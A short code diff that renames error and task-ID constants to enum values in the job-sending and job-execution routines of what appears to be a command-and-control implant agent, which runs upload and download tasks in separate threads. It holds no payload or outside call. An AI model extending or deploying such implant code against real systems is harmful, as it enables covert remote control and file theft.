@@ -94,7 +94,7 @@ auto DECLFN Jobs::Send(
             Self->Pkg->Int32( PostJobs, PkgLen );
 
             Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
-            Self->Pkg->Int16( PostJobs, KhError );
+            Self->Pkg->Int16( PostJobs, Enm::Task::Error );
             Self->Pkg->Int32( PostJobs, Current->ExitCode );
 
             if ( MsgLen > 0 && ErrorMsg ) {
@@ -162,8 +162,8 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
             KhDbg( "executing command id: %d", Current->CmdID );
 
             if ( 
-                Current->CmdID == TskUpload   ||
-                Current->CmdID == TskDownload
+                Current->CmdID == Enm::Task::Upload   ||
+                Current->CmdID == Enm::Task::Download
             ) {
                 Current->Thread.Handle = Self->Krnl32.CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)&this->Execute, Current, 0, &Current->Thread.ID );
             } else {
